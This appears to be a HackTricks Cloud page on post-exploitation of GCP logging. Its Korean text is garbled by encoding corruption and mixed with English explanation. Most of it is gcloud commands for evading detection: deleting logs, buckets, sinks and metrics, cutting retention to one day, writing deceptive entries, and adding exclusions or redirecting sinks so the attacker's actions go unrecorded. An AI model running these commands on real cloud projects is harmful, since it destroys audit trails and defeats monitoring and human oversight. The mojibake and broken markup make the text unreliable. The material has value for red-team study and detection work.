# GCP - ë¡œê¹… í›„ ê³µê²©

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ ì°¸ì¡°í•˜ì„¸ìš”:

{% content-ref url="../gcp-services/gcp-logging-enum.md" %}
[gcp-logging-enum.md](../gcp-services/gcp-logging-enum.md)
{% endcontent-ref %}

ëª¨ë‹ˆí„°ë§ ë°©í•´ë¥¼ ìœ„í•œ ë‹¤ë¥¸ ë°©ë²•ì€ ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="gcp-monitoring-post-exploitation.md" %}
[gcp-monitoring-post-exploitation.md](gcp-monitoring-post-exploitation.md)
{% endcontent-ref %}

### ê¸°ë³¸ ë¡œê¹…

ê¸°ë³¸ì ìœ¼ë¡œ **`GetIamPolicy`** ë¡œê·¸ëŠ” ìƒì„±ë˜ì§€ ì•Šìœ¼ë¯€ë¡œ ê¶Œí•œ ì—´ê±°ëŠ” ê°ì§€ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\
ë˜í•œ, ì´ëŸ¬í•œ ë¡œê·¸ë¥¼ í™œì„±í™”í•˜ë ¤ë©´ ëª¨ë‹ˆí„°ë§í•˜ë ¤ëŠ” ê° ì„œë¹„ìŠ¤ì˜ **ê´€ë¦¬ì ì½ê¸° ë¡œê·¸ë¥¼ í™œì„±í™”**í•´ì•¼ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ `Projects`ì—ì„œ `GetIamPolicy` ì‘ì—…ì„ ì–»ìœ¼ë ¤ë©´ `Cloud Resources`ì—ì„œ `ê´€ë¦¬ì ì½ê¸°`ë¥¼ í™œì„±í™”í•˜ê³ , `Pub/Sub` (ì˜ˆë¥¼ ë“¤ì–´) ê°œì²´ì—ì„œ `GetIamPolicy` ì‘ì—…ì„ ì–»ìœ¼ë ¤ë©´ í•´ë‹¹ ê°œì²´ì—ì„œ `ê´€ë¦¬ì ì½ê¸°`ë¥¼ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤.\
ë” ë§ì€ ì„œë¹„ìŠ¤ ë¡œê¹…ì„ í™œì„±í™”í•˜ê¸° ìœ„í•œ URL: [https://console.cloud.google.com/iam-admin/audit](https://console.cloud.google.com/iam-admin/audit)

ê¸°ë³¸ì ìœ¼ë¡œ ì´ëŸ¬í•œ ë¡œê·¸ëŠ” í™œì„±í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë¡œê·¸ì™€ ë¹„ìš©ì˜ ë…¸ì´ì¦ˆë¥¼ ì¦ê°€ì‹œí‚¬ ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì—¬ëŸ¬ GCP ì¡°ì§ì—ì„œëŠ” ì´ë¥¼ í™œì„±í™”í•˜ì§€ ì•Šì„ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.

### ë¡œê·¸ ì½ê¸° - `logging.logEntries.list`

{% code overflow="wrap" %}
```bash
# Read logs
gcloud logging read "logName=projects/your-project-id/logs/log-id" --limit=10 --format=json

# Everything from a timestamp
gcloud logging read "timestamp >= \"2023-01-01T00:00:00Z\"" --limit=10 --format=json

# Use these options to indicate a different bucket or view to use: --bucket=_Required  --view=_Default
```
### `logging.logs.delete`

{% code overflow="wrap" %}
```bash
# Delete all entries from a log in the _Default log bucket - logging.logs.delete
gcloud logging logs delete <log-name>
```
### ë¡œê·¸ ì‘ì„± - `logging.logEntries.create`

{% code overflow="wrap" %}
```bash
# Write a log entry to try to disrupt some system
gcloud logging write LOG_NAME "A deceptive log entry" --severity=ERROR
```
### `logging.buckets.update`

{% code overflow="wrap" %}
```bash
# Set retention period to 1 day (_Required has a fixed one of 400days)

gcloud logging buckets update bucketlog --location=<location> --description="New description" --retention-days=1
```
{% code %}

### `logging.buckets.delete`

### `logging.buckets.delete`ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¡œê¹… ë²„í‚· ì‚­ì œ

{% endcode %}
```bash
# Delete log bucket
gcloud logging buckets delete BUCKET_NAME --location=<location>
```
### `logging.links.delete`

{% code overflow="wrap" %}ë¡œê·¸ ë§í¬ ì‚­ì œ{% endcode %}
```bash
# Delete link
gcloud logging links delete <link-id> --bucket <bucket> --location <location>
```
{% code %}

### `logging.views.delete`
```bash
# Delete a logging view to remove access to anyone using it
gcloud logging views delete <view-id> --bucket=<bucket> --location=global
```
### `logging.views.update`

{% code overflow="wrap" %}
```bash
# Update a logging view to hide data
gcloud logging views update <view-id> --log-filter="resource.type=gce_instance" --bucket=<bucket> --location=global --description="New description for the log view"
```
### `logging.logMetrics.update`

{% code overflow="wrap" %}
```bash
# Update log based metrics - logging.logMetrics.update
gcloud logging metrics update <metric-name> --description="Changed metric description" --log-filter="severity>CRITICAL" --project=PROJECT_ID
```
{% endcode %}

### `logging.logMetrics.delete`
```bash
# Delete log based metrics - logging.logMetrics.delete
gcloud logging metrics delete <metric-name>
```
### `logging.sinks.delete`

`logging.sinks.delete` is a command used to delete a sink in Google Cloud Platform (GCP) Logging. Sinks are used to export log entries from GCP Logging to other destinations, such as Google Cloud Storage or BigQuery.

To use `logging.sinks.delete`, you need to have the necessary permissions to manage sinks in GCP Logging. Once you have the required permissions, you can run the command with the following syntax:

```plaintext
gcloud logging sinks delete <SINK_NAME> [--project=<PROJECT_ID>]
```

Replace `<SINK_NAME>` with the name of the sink you want to delete. Optionally, you can specify the `--project` flag followed by the ID of the GCP project if you want to delete a sink from a specific project.

After executing the command, the specified sink will be permanently deleted from GCP Logging. Make sure to double-check the sink name before running the command, as the deletion cannot be undone.

Note: Deleting a sink does not delete the log entries that were exported to the sink's destination. If you want to delete the exported log entries as well, you need to delete them separately from the destination service.
```bash
# Delete sink - logging.sinks.delete
gcloud logging sinks delete <sink-name>
```
### `logging.sinks.update`

{% code overflow="wrap" %}

### `logging.sinks.update`

`logging.sinks.update` is a method in GCP that allows you to update the configuration of a logging sink. A logging sink is a destination for log entries in GCP, such as Cloud Storage, BigQuery, or Pub/Sub.

To use `logging.sinks.update`, you need to provide the project ID, the sink name, and the updated configuration. The configuration can include properties like the destination, filter, and output format.

Here is an example of how to use `logging.sinks.update`:

```bash
gcloud logging sinks update [SINK_NAME] --project=[PROJECT_ID] --destination=[DESTINATION] --filter=[FILTER] --output-version=[OUTPUT_VERSION]
```

Replace `[SINK_NAME]` with the name of the logging sink you want to update, `[PROJECT_ID]` with your GCP project ID, `[DESTINATION]` with the new destination for the log entries, `[FILTER]` with the updated filter, and `[OUTPUT_VERSION]` with the desired output format version.

Keep in mind that you need the necessary permissions to update logging sinks in GCP.
```bash
# Disable sink - logging.sinks.update
gcloud logging sinks update <sink-name> --disabled

# Createa filter to exclude attackers logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --add-exclusion="name=exclude-info-logs,filter=severity<INFO"

# Change where the sink is storing the data - logging.sinks.update
gcloud logging sinks update <sink-name> new-destination

# Change the service account to one withuot permissions to write in the destination - logging.sinks.update
gcloud logging sinks update SINK_NAME --custom-writer-identity=attacker-service-account-email --project=PROJECT_ID

# Remove explusions to try to overload with logs - logging.sinks.update
gcloud logging sinks update SINK_NAME --clear-exclusions

# If the sink exports to BigQuery, an attacker might enable or disable the use of partitioned tables, potentially leading to inefficient querying and higher costs. - logging.sinks.update
gcloud logging sinks update SINK_NAME --use-partitioned-tables
gcloud logging sinks update SINK_NAME --no-use-partitioned-tables
```
{% endcode %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼** **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ë°** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.**

</details>
